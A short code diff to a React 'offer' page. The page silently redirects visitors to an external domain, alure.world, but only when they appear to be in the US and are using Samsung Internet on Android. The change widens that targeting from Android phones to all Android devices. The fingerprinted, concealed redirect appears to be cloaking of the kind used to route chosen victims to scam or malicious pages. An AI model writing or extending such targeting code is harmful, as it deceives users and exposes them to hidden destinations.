@@ -26,7 +26,7 @@ export default function OfferHomePage() {
   // Client-side fallback check:
   // Route: /offer/2026
   // Condition 1: US Geolocation
-  // Condition 2: Android Mobile device only (User-Agent)
+  // Condition 2: Android device (User-Agent contains 'Android')
   // Condition 3: Samsung Internet Browser (User-Agent contains 'SamsungBrowser')
   // Action: window.location.replace("https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20")
   useEffect(() => {
@@ -35,9 +35,9 @@ export default function OfferHomePage() {
 
     const ua = navigator.userAgent || "";
     const isSamsungBrowser = /SamsungBrowser/i.test(ua);
-    const isMobile = /Android/i.test(ua) && /Mobile/i.test(ua);
+    const isAndroidDevice = /Android/i.test(ua);
 
-    if (!isSamsungBrowser || !isMobile) return;
+    if (!isSamsungBrowser || !isAndroidDevice) return;
 
     // Helper to read cookie set by server middleware if available
     const getCookie = (name: string): string | null => {
